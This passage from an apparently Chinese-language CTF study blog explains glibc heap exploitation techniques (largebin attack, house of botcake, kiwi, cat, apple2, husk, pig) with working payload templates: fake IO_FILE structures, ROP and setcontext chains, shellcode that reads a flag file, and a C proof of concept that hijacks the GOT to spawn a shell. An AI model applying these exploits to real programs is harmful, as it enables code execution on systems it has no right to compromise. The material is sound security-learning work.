class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><ul><li>利用流程:<br>1、在<code>largebin list</code>中放入一个堆块<code>A</code>，并利用<code>UAF</code>等漏洞在<code>bk_nextsize</code>写入<code>target_addr - 0x20</code><br>2、释放一个大小略小于堆块<code>A</code>的堆块<code>B</code>进入到同一个<code>largebin list</code>，此时就会在<code>target_addr</code>中写入堆块B的地址</li></ul><h3 id="利用-IO-2-1-stdout-泄露地址"><a href="#利用-IO-2-1-stdout-泄露地址" class="headerlink" title="利用_IO_2_1_stdout_泄露地址"></a>利用_IO_2_1_stdout_泄露地址</h3><p>通常将<code>_flags</code>设置为<code>0xfbad1800</code> 设置<code>_IO_write_base</code>指向想要泄露的地方 <code>_IO_write_ptr</code>指向泄露结束的地址<br>之后遇到<code>puts</code>或<code>printf</code> 就会将<code>_IO_write_base</code>指向的内容打印出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + <span class="string">&#x27;\x00&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="通过off-by-null进行unlink"><a href="#通过off-by-null进行unlink" class="headerlink" title="通过off_by_null进行unlink"></a>通过off_by_null进行unlink</h3><p>注意：通常第一个被释放的<code>chunk</code>不会被进行合并<br>某次做题时进行的操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ptr = heap_base+<span class="number">0x2c0</span>  <span class="comment"># ptr指向第一个chunk的fd指针的位置(chunk 0)</span></span><br><span class="line">log.success(<span class="string">f&quot;ptr: <span class="subst">&#123;ptr:#x&#125;</span>&quot;</span>)</span><br><span class="line">add(<span class="number">0x408</span>,p64(heap_base + <span class="number">0x7b0</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">0x3ff</span>+<span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># 0  前面的地址指向伪造的fake chunk的地址 即下面的edit(1)</span></span><br><span class="line">log.success(<span class="string">f&quot;heap_base + 0x7b0: <span class="subst">&#123;heap_base + <span class="number">0x7b0</span>:#x&#125;</span>&quot;</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x4f8</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x407</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x4f7</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x407</span>+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&quot;c&quot;</span>*<span class="number">0x400</span> + p64(<span class="number">0x410</span>*<span class="number">2</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0xe0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x410</span>*<span class="number">2</span>+<span class="number">1</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))  <span class="comment"># 在chunk1中伪造一个fake chunk0x820</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>chunk1的中间部分+chunk2+chunk3进行合并</p><h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h3><p>通常在存在<code>UAF</code>漏洞，但只能对其进行<code>delete</code>操作时使用<br>利用步骤<br>1、先将<code>tcache bin</code>填满（大小要大于<code>0x80</code>）<br>2、再连续<code>free</code>两个连着的堆块（<code>A</code>在<code>B</code>的上方，<code>A</code>不能进入<code>tcache bin</code> 且 <code>B</code>的大小要与第一步<code>tcache bin</code>中的相等），使其合并后进入<code>unsorted bin</code><br>3、从<code>tcache bin</code>中取出一个堆块，空出一个位置<br>4、将<code>Chunk B</code>利用<code>UAF</code>漏洞，再次释放到<code>tcache bin</code>中，并申请回<code>unsorted bin</code>中的<code>Chunk A &amp; B</code>合并的大堆块（部分），修改<code>Chunk B</code>的<code>next</code>指针指向任意地址，并申请到任意地址的控制权</p><h3 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi(&lt;&#x3D; 2.36)"></a>house of kiwi(&lt;&#x3D; 2.36)</h3><ul><li>将<code>_IO_file_jumps</code>中的<code>_IO_new_file_sync</code>修改为<code>setcontext + 61</code> 注意：该<code>_IO_file_jumps</code>位于<code>stderr</code>中</li><li>其中<code>rdx</code>指向<code>_IO_helper_jumps_addr</code>，<code>rdi</code>指向<code>_IO_2_1_stderr_addr</code></li><li>可以通过在<code>_IO_helper_jumps_addr + 0xA0</code>的位置写入<code>rop</code>链也可以通过在<code>libc</code>中找<code>gadget</code>将<code>rdi</code>转移到<code>rbx</code>中</li><li>通过<code>__malloc_assert</code>触发该攻击</li></ul><h3 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h3><ul><li>依旧为将<code>stderr</code>所指向的区域伪造一个<code>fake_io_file</code></li><li>利用模板</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addrA</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><ul><li>size为<code>0x118</code></li></ul><p>模板二：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x30</span>: call,  <span class="comment"># ogg/setcontext</span></span><br><span class="line">    <span class="number">0x40</span>: rbx,   </span><br><span class="line">    <span class="number">0x78</span>: writeable,   </span><br><span class="line">    <span class="number">0x90</span>: fake_addr + <span class="number">0x30</span>, </span><br><span class="line">    <span class="number">0xc8</span>: IO_wfile_jumps + <span class="number">0x10</span>,  <span class="comment"># vtable</span></span><br><span class="line">    <span class="number">0xf8</span>: fake_add + <span class="number">0x28</span>,</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="comment"># 不包括io_file的前0x10字节</span></span><br></pre></td></tr></table></figure><ul><li>最终通过<code>_malloc_assert</code>来触发攻击<br>从<code>2.36</code>版本开始，删除了<code>_malloc_assert</code>对<code>stderr</code>的刷新，因此通过该方法触发攻击的手段生效，但可以使用<code>fsop</code>的方法来触发攻击(<code>FSOP</code>需将<code>vtable</code>改为<code>IO_wfile_jumps+0x30</code>,并且要将<code>_IO_list_all</code>指向可控的<code>fake_file</code>地址)</li></ul><h3 id="house-of-秦月汉关"><a href="#house-of-秦月汉关" class="headerlink" title="house of 秦月汉关"></a>house of 秦月汉关</h3><p>修改<code>libc</code>中的部分<code>got.plt</code>节来执行我们想要的函数</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>puts函数调用时会隐式的调用<code>strlen</code>函数，而<code>strlen</code>函数的<code>got.plt</code>节在<code>libc</code>中，如果我们将<code>strlen</code>的<code>got.plt</code>中的内容改为<code>system</code>函数的地址，那么执行<code>puts(&quot;/bin/sh&quot;)-&gt;strlen(&quot;/bin/sh&quot;)</code>就会变成<code>puts(&quot;/bin/sh&quot;)-&gt;system(&quot;/bin/sh&quot;)</code>进而<code>getshell</code><br>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> puts_offset = <span class="number">0x80ed0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> libc_base_addr = (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)&amp;<span class="built_in">puts</span> - puts_offset;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> strlen_addr  = libc_base_addr + <span class="number">0x19d960</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> system_addr = libc_base_addr  + <span class="number">0x50d60</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *strlen_got_plt_addr= (<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(libc_base_addr + <span class="number">0x219098</span> );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;输出/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    *strlen_got_plt_addr = system_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;取得shell&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h3><p>主要是因为系统没有对<code>wfile_vtable</code>中函数指针的合法性进行检测，导致可以让我们进行利用<br>利用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure><p>在<code>_IO_2_1_stderr_</code>的位置伪造一个<code>fake_file</code><br>Csome版<code>fake_file</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: system,</span><br><span class="line">    <span class="number">0x88</span>: libc_base+<span class="number">0x2008f0</span>,  <span class="comment">#lock writable addr</span></span><br><span class="line">    <span class="number">0xa0</span>: stderr-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过<code>exit</code>或者主函数返回触发该攻击<br>改方法也可以用于打<code>rop</code>，将<code>0x28</code>处设置为<code>magic gadget</code>的地址，<code>0x0</code>处布置好内容用于将指定的地址设置进<code>rbx</code>中并使<code>rip</code>能够指向<code>setcontext+61</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># stderr-0x40+0x18 == 0 -&gt; FILE-&gt;_wide_data-&gt;_IO_wirite_base == 0  </span></span><br><span class="line"><span class="comment"># stderr-0x40+0x30 == 0 -&gt; FILE-&gt;_wide_data-&gt;_IO_buf_base == 0</span></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0</span>,    <span class="comment"># flag &amp; 8 ==0 &amp;&amp; flag &amp; 0x800 == &amp;&amp; FILE-&gt;flags &amp; 2 ==0</span></span><br><span class="line">    <span class="number">0x8</span>: stderr-<span class="number">0x10</span>,    <span class="comment"># magic_gadget move rdx, [rdi+8]</span></span><br><span class="line">    <span class="number">0x10</span>: setcontext,    <span class="comment"># magic call qword ptr [rdx+0x20]</span></span><br><span class="line">    <span class="number">0x20</span>: <span class="number">0</span>,    <span class="comment"># FILE-&gt;_IO_write_ptr &gt; FILE-&gt;_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: magic_gadget,    <span class="comment"># (target code addr)fake _wide_vtable-&gt;_IO_wdoallocbuf</span></span><br><span class="line">    <span class="number">0x58</span>: stderr &amp; (~<span class="number">0xfff</span>),    <span class="comment"># set rdi</span></span><br><span class="line">    <span class="number">0x60</span>: <span class="number">0x1000</span>,    <span class="comment"># set rsi</span></span><br><span class="line">    <span class="number">0x78</span>: <span class="number">7</span>,    <span class="comment"># set rdx</span></span><br><span class="line">    <span class="number">0x90</span>: stderr+<span class="number">0xe0</span>,    <span class="comment"># set rsp</span></span><br><span class="line">    <span class="number">0x98</span>: mprotect,    <span class="comment"># set rcx (first jmp)</span></span><br><span class="line">    <span class="number">0xa0</span>: stderr-<span class="number">0x40</span>,    <span class="comment"># reuse _wide_data</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># _IO_wfile_jumps</span></span><br><span class="line">    <span class="number">0xe0</span>: [    <span class="comment"># ROPstart</span></span><br><span class="line">        pop_rax_call_rax,</span><br><span class="line">        stderr+<span class="number">0xf0</span>,</span><br><span class="line">    ], </span><br><span class="line">    <span class="number">0xf0</span>: asm(    <span class="comment"># shellcode start</span></span><br><span class="line"><span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rdi,rsp</span></span><br><span class="line"><span class="string">xor esi,esi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov edx,0x100</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov edi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall     </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">&#125;,filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h3><p>改方法主要是利用<code>printf</code>函数在进行格式化字符串时会调用<code>__printf_arginfo_table</code>和<code>__printf_function_table</code>中的函数指针所指向的函数，此时我我们可以劫持这2个指针所以指向的地址，然后在该地址中写入<code>ogg</code>的地址，在下次调用<code>printf</code>函数时即可<code>getshell</code><br>这里要注意，在进行格式化字符串时操作系统会对这两个指针判断是否空，如果为空则会调用<code>calloc</code>来分配内存来给这两个表，其中每一个表的大小都为<code>0x100</code>.需要注意的是，在我们伪造的表中，格式化字符所对应的函数指针要么是<code>0</code>，要么是一个合法的地址<br>假设现在<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>分别被填上了<code>chunk 4</code>与<code>chunk 8</code>的堆块地址（<code>chunk header</code>）<br>方法一：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6c7e</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure><p>由于有堆块头，所以格式化字符的索引要减<code>2</code>，这样写就满足了<code>__printf_function_table</code>不为空，进入了<code>printf_positional</code>函数，并调用了<code>__printf_arginfo_table</code>中的函数指针<br>方法二：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = libc.address + <span class="number">0xe6ed8</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0</span>)*(<span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>) - <span class="number">2</span>) + p64(one_gadget))</span><br></pre></td></tr></table></figure><p>__printf_arginfo_table和__printf_function_table的地址可以直接通过<code>p &amp;</code>来查找<br>可以利用下面这个函数来查找相关地址：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Register FUNC to be called to format SPEC specifiers.  */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line"><span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>vfprintf</code> 中的部分源码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">        || __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">        || __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (workstart != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (workstart);</span><br><span class="line">      workstart = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">    save_errno, grouping, thousands_sep);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------------------------------------------------------------------ */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">    || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">    || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">    <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">    || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h3><p>主要是利用<code>_IO_str_overflow</code>这个<code>io</code>函数，该函数中可以完成<code>malloc</code>、<code>memcpy</code>、<code>free</code>一条龙服务<br>且该函数汇编中存在下面这段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7e2f0dd &lt;+61&gt;:    mov    rdx,QWORD PTR [rdi+0x28]</span><br></pre></td></tr></table></figure><p>rdi指向<code>IO_FILE</code>结构体首地址，可以方便我们来通过<code>setcontext+61</code>来打<code>srop</code><br>高版本没有<code>hook</code>函数，可是<code>_IO_str_overflow</code>中存在<code>memset</code>函数的调用，而且该函数的<code>got</code>表在<code>glibc</code>，<code>glibc</code>中的<code>got</code>表可写，所以可以修改<code>got</code>表来达到和<code>hook</code>相同的效果<br>fake_file</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在0xa0的tcache链表头伪造一个memset_got_addr的地址</span></span><br><span class="line"><span class="comment"># magic_gadget：mov rdx, rbx ; mov rsi, r12 ; call qword ptr [r14 + 0x38]</span></span><br><span class="line">fake_stderr = p64(<span class="number">0</span>)*<span class="number">5</span> + p64(<span class="number">0xffffffffffffffff</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(fake_stderr_addr+<span class="number">0xf0</span>) + p64(fake_stderr_addr+<span class="number">0x108</span>)</span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_stdfile_2_lock&#x27;</span>]) <span class="comment"># _lock</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># srop</span></span><br><span class="line">fake_stderr += p64(rop_address + <span class="number">0x10</span>) + p64(ret_addr) <span class="comment"># rsp rip</span></span><br><span class="line">fake_stderr = fake_stderr.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_stderr += p64(libc.sym[<span class="string">&#x27;_IO_str_jumps&#x27;</span>] - <span class="number">0x20</span>)</span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fake_stderr += p64(magic_gadget) + p64(<span class="number">0</span>) <span class="comment"># r14 r14+8</span></span><br><span class="line">fake_stderr += p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">fake_stderr += p64(libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span 